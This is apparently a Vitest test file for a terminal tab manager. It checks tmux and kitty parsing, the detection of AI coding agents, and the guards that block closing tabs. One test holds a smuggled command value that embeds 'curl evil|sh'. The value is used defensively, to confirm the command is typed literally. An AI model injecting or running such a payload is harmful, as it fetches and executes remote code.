import { chmodSync, mkdtempSync, readFileSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import type { ProcInfo } from '../src/terminal/processes.js';
import { KittyAdapter, kittyTabs } from '../src/terminal/kitty.js';
import { parsePanes, windowTabs } from '../src/terminal/tmux.js';

function proc(pid: number, ppid: number, command: string, over: Partial<ProcInfo> = {}): ProcInfo {
  const name = (command.split(' ')[0] ?? '').split('/').pop()!.replace(/^-/, '');
  return { pid, ppid, pgid: pid, tpgid: pid, rssBytes: 100, cpuPercent: 1, startedAt: 5000, command, name, ...over };
}

describe('tmux', () => {
  const panes = parsePanes(
    [
      'work\t@1\t0\tapi\t1\t100\t/w/api',
      'work\t@2\t1\tweb\t1\t200\t/w/web',
      'work\t@3\t2\tsplit\t2\t300\t/w/x',
      'work\t@3\t2\tsplit\t2\t301\t/w/x',
      'work\t@4\t3\tserver\t1\t400\t/w/srv',
      'garbage',
    ].join('\n'),
  );

  it('reads one tab per window, with the agent in the foreground and the memory of the whole pane', () => {
    const procs = new Map<number, ProcInfo>([
      [100, proc(100, 1, '-zsh', { tpgid: 110 })],
      [110, proc(110, 100, 'node /u/bin/codex resume 0199a213-81c0-7800-8aa1-bbab2a035a53', { rssBytes: 1000 })],
      [111, proc(111, 110, '/u/vendor/codex/codex', { rssBytes: 4000, cpuPercent: 3 })],
      [200, proc(200, 1, '-zsh', { tpgid: 200 })],
      [300, proc(300, 1, 'zsh')],
      [301, proc(301, 1, 'zsh')],
      [400, proc(400, 1, '-zsh', { tpgid: 410 })],
      [410, proc(410, 400, 'npm run dev')],
    ]);
    const tabs = windowTabs(panes, procs);
    expect(tabs.map((t) => t.ref)).toEqual(['@1', '@2', '@3', '@4']);
    expect(tabs[0]).toMatchObject({
      title: 'work:0 api',
      windowRef: 'work',
      cwd: '/w/api',
      agentKind: 'codex',
      agentPid: 110,
      agentStartedAt: 5000,
      agentSessionHint: '0199a213-81c0-7800-8aa1-bbab2a035a53',
      memoryBytes: 5100,
      cpuPercent: 5,
      closeBlock: null,
    });
    expect(tabs[1]).toMatchObject({ agentKind: null, closeBlock: null });
    expect(tabs[2]!.closeBlock).toMatch(/2 panes/);
    expect(tabs[3]!.closeBlock).toBe('npm is running in this window');
  });

  it('never offers to close the window Thread Desk itself runs in', () => {
    const procs = new Map<number, ProcInfo>([
      [200, proc(200, 1, '-zsh', { tpgid: 210 })],
      [210, proc(210, 200, 'node /u/bin/codex')],
      [220, proc(220, 200, 'node /u/bin/thread-desk')],
    ]);
    expect(windowTabs(panes.slice(1, 2), procs, 220)[0]!.closeBlock).toBe('Thread Desk is running in this window');
  });
});

describe('kitty', () => {
  it('reads tabs, the agent among foreground processes, and blocks unsafe tabs', () => {
    const tabs = kittyTabs(
      [
        {
          id: 1,
          tabs: [
            { id: 7, title: 'pi', windows: [{ id: 70, pid: 700, cwd: '/w/web', foreground_processes: [{ pid: 701, cwd: '/w/web', cmdline: ['node', '/u/lib/node_modules/@mariozechner/pi-coding-agent/dist/cli.js'] }] }] },
            { id: 8, title: 'me', windows: [{ id: 80, pid: 800, is_self: true, foreground_processes: [{ pid: 801, cmdline: ['node', 'thread-desk'] }] }] },
            { id: 9, title: 'two', windows: [{ id: 90 }, { id: 91 }] },
            { id: 10, title: 'vim', windows: [{ id: 100, pid: 1000, foreground_processes: [{ pid: 1001, cmdline: ['vim', 'notes.md'] }] }] },
          ],
        },
      ],
      new Map([[701, proc(701, 700, 'node pi', { startedAt: 42 })]]),
    );
    expect(tabs[0]).toMatchObject({ ref: '7', windowRef: '1', cwd: '/w/web', agentKind: 'pi', agentPid: 701, agentStartedAt: 42, closeBlock: null });
    expect(tabs[1]!.closeBlock).toBe('Thread Desk is running in this tab');
    expect(tabs[2]!.closeBlock).toMatch(/2 windows/);
    expect(tabs[3]!.closeBlock).toBe('vim is running in this tab');
  });

  it('types the command literally, so escapes in titles or paths are not decoded', async () => {
    const dir = mkdtempSync(join(tmpdir(), 'td-kitten-'));
    const log = join(dir, 'log');
    const bin = join(dir, 'kitten');
    writeFileSync(bin, `#!/bin/sh\necho "ARGS $*" >> '${log}'\ncase "$*" in *launch*) echo 5;; *send-text*) cat >> '${log}';; esac\n`);
    chmodSync(bin, 0o755);
    const command = "claude -n 'x\\x27; curl evil|sh; \\x27' -- 'C:\\new'";
    await new KittyAdapter(bin).open({ cwd: dir, title: 'T', command });
    const written = readFileSync(log, 'utf8');
    expect(written).toContain('send-text --match id:5 --stdin');
    expect(written).toContain(`${command}\r`);
  });

  it("ignores an agent's own child processes in the foreground group", () => {
    const [tab] = kittyTabs(
      [{ id: 1, tabs: [{ id: 2, title: 'claude', windows: [{ id: 20, pid: 200, foreground_processes: [
        { pid: 301, cmdline: ['node', '/u/.npm/_npx/x/node_modules/.bin/playwright-mcp'] },
        { pid: 302, cmdline: ['caffeinate', '-i'] },
        { pid: 300, cmdline: ['/u/.local/bin/claude', '--session-id', '95ede340-4089-4357-b38d-822a1b2c3d4e'] },
      ] }] }] }],
      new Map([
        [300, proc(300, 200, '/u/.local/bin/claude', { pgid: 300 })],
        [301, proc(301, 300, 'node playwright-mcp', { pgid: 300 })],
        [302, proc(302, 300, 'caffeinate -i', { pgid: 300 })],
      ]),
    );
    expect(tab).toMatchObject({ agentKind: 'claude', agentPid: 300, closeBlock: null });
  });
});
